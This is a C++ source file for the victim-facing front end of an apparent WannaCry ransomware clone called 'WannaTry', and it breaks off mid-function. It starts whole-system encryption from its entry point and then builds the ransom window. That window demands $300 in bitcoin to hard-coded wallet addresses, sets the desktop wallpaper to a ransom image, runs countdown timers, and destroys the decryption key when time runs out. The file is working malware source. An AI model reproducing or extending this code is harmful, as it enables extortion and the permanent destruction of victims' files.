// Decryptor.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "../Common/common.h"
#include "Decryptor.h"
#include "../Common/ezfile.h"
#include "../Common/socktool.h"
#include "../WannaTry/FileList.h"
#include "../WannaTry/WanaDecryptor.h"
#include "../WannaTry/WanaEncryptor.h"
#include "../WannaTry/WanaProc.h"
#include "../EZCrypt/EZRC4.h"
#include "../EZCrypt/Keys.h"
#pragma comment(lib,  "Comctl32.lib") 
#pragma comment(lib,  "ws2_32.lib") 
#include <stdio.h>
#include <ShlObj.h>
#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Windows Frame Variables
HMODULE hRichEditDll = NULL;
HWND hWndCheckPayment;
HWND hWndDecrypt;
HWND hWndRichEdit;
HWND hWndEdit;
HWND hWndCopy;
HWND hWndQRCode;
HWND hWndAboutBitcoin;
HWND hWndBuyBitcoin;
HWND hWndContactUs;
HWND hWndOoops;
HWND hWndFileLost;
HWND hWndDate1;
HWND hWndTime1;
HWND hWndProgress1;
HWND hWndTimeLeft1;
HWND hWndGroupBox1;
HWND hWndPaymentRaise;
HWND hWndDate2;
HWND hWndTime2;
HWND hWndProgress2;
HWND hWndTimeLeft2;
HWND hWndGroupBox2;
HWND hWndSendBitcoin;
HWND hWndGroupBox3;
HWND hWndComboBox;

//
struct ComboBoxItem {
	ULONG rcID;
	CONST LPCTSTR str;
} ComboItems[]{
	{ IDR_MSG_BULGARIAN, _T("Bulgarian") },
	{ IDR_MSG_CHINESE_SIMPLIFIED, _T("Chinese, (Simplified)")  },
	{ IDR_MSG_CHINESE_TRADITIONAL, _T("Chinese, (Traditional)")  },
	{ IDR_MSG_CROATIAN, _T("Croatian") },
	{ IDR_MSG_CZECH, _T("Czech") },
	{ IDR_MSG_DANISH, _T("Danish") },
	{ IDR_MSG_DUTCH, _T("Dutch") },
	{ IDR_MSG_ENGLISH, _T("English") },
	{ IDR_MSG_FILIPINO, _T("Filipino") },
	{ IDR_MSG_FINNISH, _T("Finnish") },
	{ IDR_MSG_FRENCH, _T("French") },
	{ IDR_MSG_GERMAN, _T("German") },
	{ IDR_MSG_GREEK, _T("Greek") },
	{ IDR_MSG_INDONESIAN, _T("Indonesian") },
	{ IDR_MSG_ITALIAN, _T("Italian") },
	{ IDR_MSG_JAPANESE, _T("Japanese") },
	{ IDR_MSG_KOREAN, _T("Korean") },
	{ IDR_MSG_LATVIAN, _T("Latvian") },
	{ IDR_MSG_NORWEGIAN, _T("Norwegian") },
	{ IDR_MSG_POLISH, _T("Polish") },
	{ IDR_MSG_PORTUGUESE, _T("Portuguese") },
	{ IDR_MSG_ROMANIAN, _T("Romanian") },
	{ IDR_MSG_RUSSIAN, _T("Russian") },
	{ IDR_MSG_SLOVAK, _T("Slovak") },
	{ IDR_MSG_SPANISH, _T("Spanish") },
	{ IDR_MSG_SWEDISH, _T("Swedish") },
	{ IDR_MSG_TURKISH, _T("Turkish") },
	{ IDR_MSG_VIETNAMESE, _T("Vietnamese") },
	{0, nullptr}
};




// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

INT_PTR CALLBACK    DecryptDialog(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    CheckPaymentDialog(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.

	///////////////////////////////////////////////////////////////
	// Encrypt whole system here, if failed, exit.
	///////////////////////////////////////////////////////////////
	if (!Start_Wannatry(MUTEX_NAME)) {
		return 1;
	}
	///////////////////////////////////////////////////////////////
	// Show Ransom UI
	///////////////////////////////////////////////////////////////

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_DECRYPTOR, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // Perform application initialization:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_DECRYPTOR));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_DECRYPTOR));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
 	wcex.hbrBackground  = CreateSolidBrush(BACKGROUND);
	wcex.lpszMenuName   = 0;
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

///////////////////////////////////////////////////////////
// Get Start Time From RES File
///////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////
// Create all windows, buttons, and draw texts here
///////////////////////////////////////////////////////////

void CreateAllWindows(HWND hWnd)
{
	const TCHAR* apBitcoin[] = {
		_T("115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn"),
		_T("12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"),
		_T("13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94")
	};
	//
	hRichEditDll = LoadLibrary(_T("Msftedit.dll"));
	//
	HFONT hFont8B = CreateFont(8, 0, 0, 0,
		FW_BLACK, FALSE, FALSE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont8BU = CreateFont(8, 0, 0, 0,
		FW_BLACK, FALSE, TRUE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont10BU = CreateFont(10, 0, 0, 0,
		FW_BLACK, FALSE, TRUE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont12B = CreateFont(12, 0, 0, 0,
		FW_BLACK, FALSE, FALSE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont12BU = CreateFont(12, 0, 0, 0,
		FW_BLACK, FALSE, TRUE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont14B = CreateFont(14, 0, 0, 0,
		FW_BLACK, FALSE, FALSE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont16B = CreateFont(16, 0, 0, 0,
		FW_BLACK, FALSE, FALSE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont20B = CreateFont(20, 0, 0, 0,
		FW_BLACK, FALSE, FALSE, FALSE,
		DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Arial"));
	HFONT hFont14T = CreateFont(14, 0, 0, 0,
		FW_DONTCARE, FALSE, FALSE, FALSE,
		DEFAULT_CHARSET, OUT_RASTER_PRECIS,
		CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
		VARIABLE_PITCH, _T("Terminal"));
	// Check Payment Button
	hWndCheckPayment = CreateWindowEx(
		0,
		BUTTON_CLASS,
		_T("Check &Payment"),
		BS_PUSHBUTTON | WS_CHILD | WS_VISIBLE | WS_TABSTOP,
		160, 336, 180, 19,
		hWnd, (HMENU) IDB_CHECKPAYMENT, hInst, NULL);
	SendMessage(hWndCheckPayment,
		WM_SETFONT, (WPARAM)hFont16B, TRUE);
	// Decrypt Button
	hWndDecrypt = CreateWindowEx(
		0,
		BUTTON_CLASS,
		_T("&Decrypt"),
		BS_PUSHBUTTON | WS_CHILD | WS_VISIBLE | WS_TABSTOP,
		360, 336, 180, 19,
		hWnd, (HMENU)IDB_DECRYPT, hInst, NULL);
	SendMessage(hWndDecrypt,
		WM_SETFONT, (WPARAM)hFont16B, TRUE);
	// Richedit
	hWndRichEdit = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		MSFTEDIT_CLASS,
		_T(""),
		ES_LEFT | ES_MULTILINE | ES_AUTOVSCROLL |
		ES_READONLY | ES_WANTRETURN | WS_CHILD |
		WS_VISIBLE | WS_BORDER | WS_VSCROLL |
		WS_TABSTOP,
		160, 26, 380, 251,
		hWnd, NULL, hInst, NULL);
	// Edit
	hWndEdit = CreateWindowEx(
		0,
		EDIT_CLASS,
		_T(""),
		ES_LEFT | ES_AUTOHSCROLL | ES_READONLY |
		WS_CHILD | WS_VISIBLE | WS_BORDER | WS_TABSTOP,
		257, 304, 254, 19,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndEdit,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	SendMessage(hWndEdit,
		WM_SETTEXT, (WPARAM)TRUE, (LPARAM)apBitcoin[0]);
	// Set Text
	hWndCopy = CreateWindowEx(
		0,
		BUTTON_CLASS,
		_T("Copy"),
		BS_PUSHBUTTON | WS_CHILD | WS_VISIBLE | WS_TABSTOP,
		513, 302, 22, 22,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndCopy,
		WM_SETFONT, (WPARAM)hFont8B, TRUE);
	hWndQRCode = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("QR Code"),
		SS_LEFT | WS_CHILD | WS_GROUP,
		508, 287, 29, 12,
		hWnd, NULL, hInst, NULL);
	hWndAboutBitcoin = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("About bitcoin"),
		SS_LEFT | WS_CHILD | WS_VISIBLE | WS_GROUP,
		18, 298, 119, 10,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndAboutBitcoin,
		WM_SETFONT, (WPARAM)hFont10BU, TRUE);
	hWndBuyBitcoin = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("How to buy bitcoins?"),
		SS_LEFT | WS_CHILD | WS_VISIBLE | WS_GROUP,
		18, 316, 119, 10,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndBuyBitcoin,
		WM_SETFONT, (WPARAM)hFont8BU, TRUE);
	hWndContactUs = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("Contact Us"),
		SS_LEFT | WS_CHILD | WS_VISIBLE | WS_GROUP,
		18, 334, 119, 10,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndContactUs,
		WM_SETFONT, (WPARAM)hFont12BU, TRUE);
	hWndOoops = CreateWindowEx(
		WS_EX_TRANSPARENT,
		STATIC_CLASS,
		_T("Ooops, your files have been encrypted!"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		160, 3, 302, 19,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndOoops,
		WM_SETFONT, (WPARAM)hFont16B, TRUE);
	hWndFileLost = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("Your files will be lost on"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		16, 196, 126, 11,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndFileLost,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	hWndDate1 = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("1/1/2017 00:00:00"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		11, 215, 124, 11,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndDate1,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	hWndTime1 = CreateWindowEx(
		0, STATIC_CLASS,
		_T("00:00:00:00"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		15, 251, 121, 21,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndTime1,
		WM_SETFONT, (WPARAM)hFont14T, TRUE);
	hWndTimeLeft1 = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("Time Left"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		34, 235, 80, 11,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndTimeLeft1,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	hWndGroupBox1 = CreateWindowEx(
		0,
		BUTTON_CLASS,
		_T(""),
		BS_GROUPBOX | WS_CHILD | WS_VISIBLE,
		6, 184, 149, 93,
		hWnd, NULL, hInst, NULL);
	hWndPaymentRaise = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("Payment will be raised on"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		10, 100, 140, 11,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndPaymentRaise,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	hWndDate2 = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("1/1/2017 00:00:00"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		11, 118, 124, 11,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndDate2,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	hWndTime2 = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("00:00:00:00"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		15, 155, 121, 21,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndTime2,
		WM_SETFONT, (WPARAM)hFont14T, TRUE);
	hWndTimeLeft2 = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("Time Left"),
		SS_CENTER | WS_CHILD | WS_VISIBLE | WS_GROUP,
		34, 140, 80, 11,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndTimeLeft2,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	hWndGroupBox2 = CreateWindowEx(
		0,
		BUTTON_CLASS,
		_T(""),
		BS_GROUPBOX | WS_CHILD | WS_VISIBLE,
		6, 88, 149, 93,
		hWnd, NULL, hInst, NULL);
	hWndSendBitcoin = CreateWindowEx(
		0,
		STATIC_CLASS,
		_T("Send $300 worth of bitcoin to this address:"),
		SS_LEFT | WS_CHILD | WS_VISIBLE | WS_GROUP,
		257, 286, 277, 15,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndSendBitcoin,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	hWndGroupBox3 = CreateWindowEx(
		0,
		BUTTON_CLASS,
		_T(""),
		BS_GROUPBOX | WS_CHILD | WS_VISIBLE,
		160, 278, 379, 51,
		hWnd, NULL, hInst, NULL);
	hWndComboBox = CreateWindowEx(
		0,
		COMBOBOX_CLASS,
		_T(""),
		CBS_DROPDOWNLIST | WS_CHILD | WS_VISIBLE |
		WS_VSCROLL | WS_TABSTOP,
		466, 7, 73, 149,
		hWnd, NULL, hInst, NULL);
	SendMessage(hWndComboBox,
		WM_SETFONT, (WPARAM)hFont12B, TRUE);
	SendMessage(hWndComboBox,
		CB_SETDROPPEDWIDTH, (WPARAM)140, 0);
	return;
}

///////////////////////////////////////////////////////////
// Create Combobox
// https://docs.microsoft.com/en-us/windows/desktop/controls/create-a-simple-combo-box
///////////////////////////////////////////////////////////
void CreateComboBox(
	HWND hWndCombo,
	struct ComboBoxItem Items[])
{
	
	TCHAR A[100];
	ZeroMemory(A, sizeof(A));
	for (INT i = 0; Items[i].rcID; i++) {
		_tcscpy_s(A, sizeof(A) / sizeof(TCHAR),
			Items[i].str);
		SendMessage(hWndCombo,
			(UINT)CB_ADDSTRING, (WPARAM)0, (LPARAM)A);
	}
	SendMessage(hWndCombo,
		CB_SETCURSEL, (WPARAM)2, (LPARAM)0);
}

///////////////////////////////////////////////////////////
// Draw pictures
///////////////////////////////////////////////////////////

BOOL DrawBitmapByID(
	HDC hdc,
	ULONG rcID,
	ULONG x,
	ULONG y,
	ULONG w,
	ULONG h,
	ULONG w2,
	ULONG h2)
{
	HDC hdcCompat = CreateCompatibleDC(hdc);
	SetStretchBltMode(hdc, HALFTONE);
	HBITMAP hBitmap = LoadBitmap(hInst,
		MAKEINTRESOURCE(rcID));
	SelectObject(hdcCompat, hBitmap);
	StretchBlt(hdc, x, y, w, h,
		hdcCompat, 0, 0, w2, h2, SRCCOPY);
	DeleteDC(hdcCompat);
	DeleteObject(hBitmap);
	return TRUE;
}

///////////////////////////////////////////////////////////
// Draw progressbar
///////////////////////////////////////////////////////////

void DrawProgressBar(
	HDC hdc,
	LONG x,
	LONG y,
	LONG w,
	LONG h,
	LONG p) // percentage
{
	LONG r1 = 0,   g1 = 255, b1 = 0;
	LONG r2 = 255,   g2 = 0, b2 = 0;
	LONG t = h * p / 100;
	HPEN hPen;
	for (LONG i = 0; i < h; i++) {
		if (h - i < t) {
			LONG r = i * (r2 - r1) / h + r1;
			LONG g = i * (g2 - g1) / h + g1;
			LONG b = i * (b2 - b1) / h + b1;
			hPen = CreatePen(PS_SOLID, 1, RGB(r, g, b));
		}
		else {
			hPen = CreatePen(PS_SOLID, 1, RGB(0, 0, 0));
		}
		SelectObject(hdc, hPen);
		MoveToEx(hdc, x, y + i, NULL);
		LineTo(hdc, x + w, y + i);
	}
	return;
}

void DrawProgressBar(
	HWND hWnd,
	LONG x,
	LONG y,
	LONG w,
	LONG h,
	LONG p)
{
	PAINTSTRUCT ps;
	HDC hdc = BeginPaint(hWnd, &ps);
	DrawProgressBar(hdc, x, y, w, h, p);
	EndPaint(hWnd, &ps);
	TCHAR message[1024];
	_stprintf_s(message, _T("%d%%"), p);
	//SetWindowText(hWnd, message);
	RECT rect = { x, y, x + w, y + h };
	InvalidateRect(hWnd, &rect, TRUE);
	UpdateWindow(hWnd);
	return;
}

///////////////////////////////////////////////////////////
// Change document in richedit after selecting language
///////////////////////////////////////////////////////////

BOOL UpdateRichEditByID(
	HWND hWndRE,
	ULONG rcID)
{
	PUCHAR lpMessage;
	ULONG cMessage = 0;
	HMODULE hModule = GetModuleHandle(NULL);
	if (!hModule) {
		return FALSE;
	}
	HRSRC hResource = FindResource(
		hModule,
		MAKEINTRESOURCE(rcID),
		RT_RCDATA); // substitute RESOURCE_ID and RESOURCE_TYPE.
	if (!hResource) {
		return FALSE;
	}
	HGLOBAL hMemory = LoadResource(
		hModule,
		hResource);
	if (!hMemory) {
		return FALSE;
	}
	DWORD dwSize = SizeofResource(
		hModule,
		hResource);
	if (!dwSize) {
		return FALSE;
	}
	LPVOID lpAddress = LockResource(hMemory);
	if (!lpAddress) {
		return FALSE;
	}
	lpMessage = (PUCHAR) HeapAlloc(
		GetProcessHeap(),
		0,
		dwSize);
	if (!memcmp(lpAddress, "{\\rtf", 5)) {
		CopyMemory(lpMessage, lpAddress, dwSize);
	}
	else {
		PEZRC4 pRC4 = new EZRC4();
		pRC4->GenKey(
			(PUCHAR)RESOURCE_PASSWORD,
			(ULONG) strlen(RESOURCE_PASSWORD));
		pRC4->Decrypt(
			(PUCHAR)lpAddress, dwSize,
			(PUCHAR)lpMessage, dwSize, &cMessage);
		delete pRC4;
	}
	SendMessage(hWndRE,
		EM_REPLACESEL, (WPARAM)TRUE, (LPARAM)lpMessage);
	HeapFree(GetProcessHeap(), 0, lpMessage);
	return TRUE;
}

///////////////////////////////////////////////////////////
// Set background image at desktop to show the warning message
///////////////////////////////////////////////////////////

BOOL SetBackgroundImage(
	HWND hWnd,
	ULONG rcID)
{
	TCHAR BasePath[MAX_PATH];
	TCHAR szImageFile[MAX_PATH];
	ULONG cbWrite = 0;
	BOOL bResult = FALSE;
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		BasePath);
	_tcscat_s(BasePath, MAX_PATH, _T("\\"));
	_tcscat_s(BasePath, MAX_PATH, BASE_DIRNAME);
	if (GetFileAttributes(BasePath)
		== INVALID_FILE_ATTRIBUTES) {
		if (!CreateDirectory(BasePath, NULL)) {
			MessageBox(hWnd, _T("CreateDirectory error"), _T("error"), MB_OK);
			return FALSE;
		}
	}
	_stprintf_s(szImageFile, MAX_PATH,
		_T("%s\\@WanaDecryptor@.bmp"), BasePath);
	HMODULE hModule = NULL;
	HRSRC hResource = FindResource(
		hModule,
		MAKEINTRESOURCE(rcID),
		RT_RCDATA); // substitute RESOURCE_ID and RESOURCE_TYPE.
	if (!hResource) {
		MessageBox(hWnd, _T("FindResource error"), _T("error"), MB_OK);
		return FALSE;
	}
	HGLOBAL hMemory = LoadResource(hModule, hResource);
	if (!hMemory) {
		MessageBox(hWnd, _T("LoadResource error"), _T("error"), MB_OK);
		return FALSE;
	}
	DWORD dwSize = SizeofResource(hModule, hResource);
	if (!dwSize) {
		MessageBox(hWnd, _T("sizeof error"), _T("error"), MB_OK);
		return FALSE;
	}
	LPVOID lpAddress = LockResource(hMemory);
	if (!lpAddress) {
		MessageBox(hWnd, _T("lock error"), _T("error"), MB_OK);
		return FALSE;
	}
	DWORD dwWrite = 0;
	if (!WriteBuffer(szImageFile,
		{ 0 }, 0,
		(PUCHAR)lpAddress, dwSize, &dwWrite)) {
	}
	SystemParametersInfo(SPI_SETDESKWALLPAPER,
		0, szImageFile, SPIF_UPDATEINIFILE);
	return TRUE;
}



///////////////////////////////////////////////////////////
// Show due time
///////////////////////////////////////////////////////////

BOOL SetDateTime(
	HWND hWndDateTime,
	time_t *t)
{
	TCHAR szMessage[1024];
	tm st;
	localtime_s(&st, t);
	_stprintf_s(szMessage,
		sizeof(szMessage) / sizeof(TCHAR),
		_T("%d/%d/%d %02d:%02d:%02d"),
		st.tm_mon + 1,
		st.tm_mday,
		st.tm_year + 1900,
		st.tm_hour,
		st.tm_min,
		st.tm_sec);
	SetWindowText(hWndDateTime, szMessage);
	return TRUE;
}

///////////////////////////////////////////////////////////
// Draw countdown time
///////////////////////////////////////////////////////////

BOOL SetTimeLeft(
	HWND hWndTime,
	LONG nSec)
{
	TCHAR pchTimeLeft[16];
	ULONG sec = nSec % 60;
	ULONG min = nSec / 60;
	ULONG hour = min / 60;
	min %= 60;
	ULONG days = hour / 24;
	hour %= 24;
	_stprintf_s(pchTimeLeft,
		sizeof(pchTimeLeft) / sizeof(TCHAR),
		_T("%02d:%02d:%02d:%02d"), days, hour, min, sec);
	SetWindowText(hWndTime, pchTimeLeft);
	return TRUE;
}


//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(
	HWND hWnd,
	UINT message,
	WPARAM wParam,
	LPARAM lParam)
{
	//https://www.google.com/search?q=how+to+buy+bitcoin
	//https://en.wikipedia.org/wiki/Bitcoin
	RECT clientRect;
	static LONG TimeLeft1 = 0;
	static LONG TimeLeft2 = 0;
	static BOOL DisableButton = FALSE;
    switch (message)
    {
	case WM_CREATE:
	{
		clientRect = { 0, 0, 540, 360 };
		AdjustWindowRectEx(
			&clientRect,
			WS_OVERLAPPEDWINDOW,
			0,
			TRUE);
		SetWindowPos(hWnd, NULL,
			0, 0,
			clientRect.right - clientRect.left,
			clientRect.bottom - clientRect.top,
			0);
		CreateAllWindows(hWnd);
		CreateComboBox(
			hWndComboBox,
			ComboItems);
		UpdateRichEditByID(
			hWndRichEdit,
			IDR_MSG_CHINESE_TRADITIONAL);
		SetBackgroundImage(hWnd, IDB_BITMAP3);
		PRESDATA pResData = new RESDATA(NULL);
		if (!IsKeyDestroyed(0)) {
			time_t StartTime = pResData->GetStartTime();
			time_t CurTime = time(NULL);
			time_t st1, st2;
			st1 = StartTime + FINAL_COUNTDOWN;
			st2 = StartTime + PRICE_COUNTDOWN;
			TimeLeft1 = (LONG)(st1 - CurTime);
			TimeLeft2 = (LONG)(st2 - CurTime);
			SetDateTime(hWndDate1, &st1);
			SetDateTime(hWndDate2, &st2);
		}
		SetTimer(hWnd,
			IDT_TIMER1,
			1000,
			(TIMERPROC)NULL);
		SetTimer(hWnd,
			IDT_TIMER2,
			30000,
			(TIMERPROC)NULL);
	}
	break;
	case WM_TIMER:
		switch (wParam)
		{
		case IDT_TIMER1:
			if (GetDecryptFlag()) {
				break;
			}
			if (TimeLeft1 > 0) {
				TimeLeft1--;
				SetTimeLeft(hWndTime1, TimeLeft1);
			}
			else {
				//////////////////////////////////
				// Delete encrypted private key
				// All encrypted file won't decrypt
				//////////////////////////////////
				Destroy_Key(0);
			}
			if (TimeLeft2 > 0) {
				TimeLeft2--;
				SetTimeLeft(hWndTime2, TimeLeft2);
			}
			//
			if (IsKeyDestroyed(0)) {
				if (!DisableButton) {
					EnableWindow(hWndCheckPayment, FALSE);
					EnableWindow(hWndDecrypt, FALSE);
					SetBackgroundImage(hWnd, IDB_BITMAP4);
					DisableButton = TRUE;
				}
			}
			break;
		case IDT_TIMER2:
			// draw progressbar
			RECT rect;
			rect = { 141, 114, 141 + 11, 114 + 56 };
			InvalidateRect(hWnd, &rect, TRUE);
			rect = { 141, 210, 141 + 11, 210 + 56 };
			InvalidateRect(hWnd, &rect, TRUE);
			UpdateWindow(hWnd);
			break;
		}
	case WM_CTLCOLORSTATIC:
	{
		HDC hdcStatic = (HDC)wParam;
		HWND hWndStatic = (HWND)lParam;
		if (hWndStatic == hWndEdit) {
			SetBkColor(hdcStatic, RGB(0xFF, 0xFF, 0xFF));
		}
		else {
			SetBkColor(hdcStatic, BACKGROUND);
		}
		if (hWndStatic == hWndEdit) {
			SetTextColor(hdcStatic, RGB(0, 0, 0));
		}
		else if (hWndStatic == hWndSendBitcoin ||
			hWndStatic == hWndFileLost ||
			hWndStatic == hWndPaymentRaise) {
			SetTextColor(hdcStatic, RGB(0xFF, 0xFF, 0));
		}
		else if (hWndStatic == hWndAboutBitcoin ||
			hWndStatic == hWndBuyBitcoin ||
			hWndStatic == hWndContactUs) {
			SetTextColor(hdcStatic,
				RGB(193, 210, 255));
		}
		else {
			SetTextColor(hdcStatic,
				RGB(0xFF, 0xFF, 0xFF));
		}
		return (INT_PTR)((HBRUSH)GetStockObject(NULL_BRUSH));
	}
	break;
    case WM_COMMAND:
		if (HIWORD(wParam) == CBN_SELCHANGE) {
			INT ItemIndex = (INT) SendMessage((HWND)lParam,
				(UINT)CB_GETCURSEL,	(WPARAM)0, (LPARAM)0);
			UpdateRichEditByID(
				hWndRichEdit,
				ComboItems[ItemIndex].rcID);
		}
        {
            int wmId = LOWORD(wParam);
            // Parse the menu selections:
            switch (wmId)
            {
			case IDB_DECRYPT:
				if (IsKeyDestroyed(0)) {
					MessageBox(hWnd,
						_T("Private Key is Destroyed, \n")
						_T("You have lost all your files.\n")
						_T("Please pay quickly next time."),
						_T("Good-Bye Forever"), MB_OK);
					break;
				}
				else if (!CheckDKYFileValid(0)) {
					MessageBox(hWnd,
						_T("You did not pay or we did not ")
						_T("confirmed your payment!\nPay now")
						_T("if you didn't and check again ")
						_T("after 2 hours...Best time to ")
						_T("check: 9:00am - 11:00am GMT from")
						_T(" Monday to Friday."),
						_T("Error"), MB_OK);
					break;
				}
				DialogBox(hInst,
					MAKEINTRESOURCE(IDD_DECRYPT),
					hWnd,
					DecryptDialog);
				break;
			case IDB_CHECKPAYMENT:
				if (IsKeyDestroyed(0)) {
					MessageBox(hWnd,
						_T("Private Key is Destroyed, \n")
						_T("You have lost all your files.\n")
						_T("Please pay quickly next time."),
						_T("Good-Bye Forever"), MB_OK);
					break;
				}
				else if (CheckDKYFileValid(0)) {
					MessageBox(hWnd,
						_T("Congratulations! Your payment has ")
						_T("been checked!\nStart decrypting now!"),
